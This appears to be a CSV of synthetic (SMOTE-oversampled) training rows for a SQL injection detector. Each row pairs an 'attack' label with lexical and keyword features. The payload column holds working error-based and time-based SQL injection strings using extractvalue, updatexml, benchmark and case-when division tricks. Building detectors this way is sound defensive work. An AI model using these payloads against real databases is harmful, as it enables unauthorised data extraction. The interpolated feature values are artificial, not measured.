id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001454,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",nearest_attack_euclidean,R000048,1.4459336519149157,153.1658580575861,29.51965540837729,3.817408820319741,43.88206754973626,36.92137836649084,53.92137836649084,18.44103377486813,0.2862962798787028,0.2410725768891298,0.3524042249530309,0.12022691827913647,0.4803445916227109,0.0,0.0,0.0,0.0,1.0,0.0,10.48034459162271,0.0,0.0,5.4803445916227105,1.0,0.4803445916227109,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001455,attack,error,"1 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000091,0.4686648597512156,139.1792035961814,25.1792035961814,3.684430781489705,34.0,39.0,49.0,17.1792035961814,0.2442912167384292,0.2802163956705511,0.352066753534795,0.1234256340562246,0.0,0.17920359618139947,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.0,1.0,0.0,0.1792035961813996,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001456,attack,error,"1' where 8083  =  8083 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000101,0.12603656548700193,161.94592702046222,30.945927020462232,3.890186208922076,39.0,47.0,55.0,20.945927020462232,0.24082159520749835,0.2902208967885237,0.339620198369549,0.1293373096344289,0.9459270204622335,0.0,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,6.0,4.0,0.9459270204622335,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001457,attack,error, (  select   (  case when   (  5603  =  5603  )   then 5603 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  ) ,nearest_attack_euclidean,R000077,0.6719564156689536,139.53682539306038,26.268412696530195,3.5543057094692463,56.0,13.463174606939608,57.53682539306039,12.53682539306039,0.40134383274598795,0.09652868589528854,0.4123179591933748,0.08980952216534872,0.26841269653019517,0.0,0.0,1.0,0.0,1.0,0.0,10.0,0.0,0.0,0.26841269653019495,2.0,0.26841269653019517,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_001458,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  ",nearest_attack_euclidean,R000114,0.6251607294036375,138.57509314337904,26.356226714155238,3.7141409800891307,32.93131985753429,39.0,48.287546571689525,18.356226714155238,0.23754367716281055,0.2814900928260618,0.34842841155519744,0.13253781845593016,1.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,6.3562267141552375,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.6437732858447622,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6437732858447625
SMOTE_001459,attack,error,select   (  case when   (  1272  =  5883  )   then 1272 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000051,0.019071147801605615,133.0,29.0,3.741352496946078,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_001460,attack,error,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,nearest_attack_euclidean,R000020,0.36257849567485906,155.0,27.332531725294267,3.770493985564628,37.99759517588281,37.669873098822926,55.66506345058854,23.667468274705733,0.24514577532827617,0.24303143934724464,0.35912944161670024,0.15269334370777893,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.0,2.0,0.0,5.6674682747057314,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001461,attack,error,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,nearest_attack_euclidean,R000049,0.7398830013882672,156.5287330894665,27.0,3.7215935154781765,36.758619926839955,37.9885067642134,57.52873308946651,24.25287330894665,0.23478749910961982,0.243174273487475,0.36705513841689835,0.15498308898600682,0.0,4.0,0.0,0.0,0.0,2.0,0.0,10.505746617893303,2.0,0.0,5.747126691053349,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001462,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000089,0.224519095167748,162.01493277292425,34.0,3.710277621070468,50.0,23.0,67.2119462183394,21.80298655458485,0.3086609210745433,0.1419840236942899,0.41479117049896996,0.13456388473219683,0.0,1.0,0.0,0.0,0.0,0.0,0.0,14.802986554584852,1.0,0.0,4.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001463,attack,error,select   (  case when   (  9103  =  9836  )   then 9103 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000121,0.0054632696935343885,133.0,28.0,3.726423908199253,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_001464,attack,error,"1"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""egzm""  =  ""egzm",nearest_attack_euclidean,R000013,1.5760507451414933,161.0,28.472924537324836,3.8936768217326225,46.41877361197451,39.0,54.05415092535033,21.527075462675164,0.2883153640495311,0.2422360248447205,0.33574006785931876,0.13370854324642958,0.0,4.0,0.0,0.0,0.0,1.527075462675163,0.0,10.0,0.0,0.0,6.0,1.527075462675163,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.527075462675163,0.47292453732483686,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001465,attack,error,"exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  1049  =  1049,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",nearest_attack_euclidean,R000108,5.224945815903159,156.72097364432324,26.233786699402447,3.4723507272454004,37.16893349701223,33.68174655209144,65.63650689581712,20.233786699402447,0.23612889714435464,0.2170082527993682,0.41767022717271063,0.1291926228835666,0.0,0.0,0.0,0.0,0.616893349701223,1.0,0.0,13.233786699402446,0.0,0.0,4.766213300597554,1.616893349701223,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.233786699402446,0.0,-1.3877787807814457e-17,0.616893349701223,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.850680049103669
SMOTE_001466,attack,error,"1 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000030,0.4573349114121062,145.85241719787138,30.88854968127717,3.816096759285269,51.11145031872283,23.37048343957428,54.37048343957428,17.0,0.3503648390195059,0.16022296885475643,0.3728243422172652,0.11658784990847253,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001467,attack,error,select   (  case when   (  5704  =  4125  )   then 5704 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000085,0.011255496358601503,133.0,28.0,3.731206331338823,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_001468,attack,error,"1""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000143,0.5528167575949173,155.1746782437122,33.16593834148071,3.755772508061352,50.0,23.0,62.340616585192926,19.834061658519293,0.3224529311497421,0.14832834832888137,0.40137411204422424,0.1278446084771523,0.0,1.0,0.0,0.0,0.0,0.0,0.0,13.668123317038585,0.16593834148070766,0.0,4.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001469,attack,error,select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000055,0.006816555428300585,133.0,30.0,3.7676420502002195,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_001470,attack,error,"1%""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000144,0.7247177828135776,154.92615462862915,34.0,3.7961739960908973,50.0,23.0,61.438462190524284,20.487692438104858,0.3231182707026419,0.14863440452321527,0.39604660698242466,0.1322007177917182,0.0,1.0,0.0,0.0,0.0,0.0,0.0,13.487692438104856,1.0,0.0,4.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001471,attack,error,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",nearest_attack_euclidean,R000027,0.10773094460087052,165.0,27.10148077480643,3.673057361079381,37.30444232441929,38.59407690077428,63.202961549612866,25.898519225193567,0.2260875292389048,0.23390349636832897,0.3830482518158355,0.15696072257693072,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,2.0,0.0,5.898519225193569,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001472,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000014,0.009024781431860234,133.0,29.0,3.7522638481134027,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_001473,attack,error,"1"" where 4066  =  4066 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",nearest_attack_euclidean,R000155,0.7253837892125696,162.0,31.0,3.8972360505093615,39.0,47.0,55.0,21.0,0.24074074074074073,0.29012345679012347,0.3395061728395062,0.12962962962962962,0.2142436332261114,0.7857563667738887,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,6.0,4.0,0.21424363322611126,0.7857563667738888,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001474,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'pphf'  =  'pphf",nearest_attack_euclidean,R000105,0.7981615048792716,161.34994654363953,29.650053456360475,3.9070331619374135,48.349946543639525,36.3997861745581,55.60021382544189,21.0,0.299652785807502,0.22556235890945753,0.34463183317647006,0.13015302210657043,4.0,0.0,0.0,0.0,0.0,1.6500534563604734,0.0,10.0,0.0,0.0,5.349946543639526,1.6500534563604736,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001475,attack,error,"1  )   where 9338  =  9338 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000015,1.1479562085334916,163.3576886037546,29.0,3.7795705173708045,41.0,43.0,59.35768860375461,20.0,0.2510195658665937,0.26326442273813483,0.36326744267985994,0.12244856871541156,0.0,0.4105778490613484,2.0,0.0,0.0,2.0,0.0,10.58942215093865,0.0,0.0,5.0,4.0,0.0,0.4105778490613484,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001476,attack,error,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000026,1.121262773491269,143.48794641509613,24.487946415096122,3.543899086744066,36.0,35.0,55.0,17.487946415096122,0.2508951985750068,0.24392588750347882,0.3833121089340381,0.12186680498747628,0.48794641509612213,0.0,0.0,0.0,0.0,1.0,0.0,11.0,0.0,0.0,5.0,1.0,0.4879464150961221,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001477,attack,error,select   (  case when   (  8841  =  9675  )   then 8841 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000071,0.015299756339000553,133.0,30.0,3.761691635428238,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_001478,attack,error,"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000113,0.7719242283680532,140.5165930541787,26.252765509029786,3.689089634148878,37.252765509029786,36.01106203611915,50.747234490970214,16.505531018059575,0.26514614054827723,0.25613777554573586,0.36132569330100445,0.11739039060498245,0.0,0.0,0.0,0.0,0.0,1.0,0.0,10.0,0.0,0.0,5.252765509029787,1.0,0.0,0.0,0.0,0.25276550902978745,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001479,attack,error,select   (  case when   (  5740  =  7636  )   then 5740 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000014,0.0,133.0,29.0,3.7536558766775228,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_001480,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'qcsi'  =  'qcsi",nearest_attack_euclidean,R000064,0.15059160827710372,161.0,28.454253458534247,3.8829016954287834,45.0,39.0,55.0,22.0,0.2795031055900621,0.2422360248447205,0.3416149068322981,0.13664596273291926,4.0,0.0,0.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,6.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,2.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001481,attack,error,select   (  case when   (  1724  =  6528  )   then 1724 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,nearest_attack_euclidean,R000055,5.448007999092045e-05,133.0,30.0,3.768701873959613,56.0,14.0,51.0,12.0,0.42105263157894735,0.10526315789473684,0.38345864661654133,0.09022556390977443,0.0,0.0,2.0,1.0,0.0,1.0,0.0,8.0,0.0,0.0,-4.440892098500626e-16,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,-1.3877787807814457e-17,2.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,7.0
SMOTE_001482,attack,error,"1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",nearest_attack_euclidean,R000104,0.6669674277858683,157.70423572587356,29.80613151328668,3.7853286624558615,46.67357815944016,35.77547394685328,56.44905210629344,18.80613151328668,0.2951578042228288,0.22775202963413574,0.3577230726799766,0.11936709346305892,0.8061315132866801,0.0,0.0,0.0,0.0,1.0,0.0,10.80613151328668,0.0,0.0,5.1938684867133205,1.0,0.8061315132866801,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
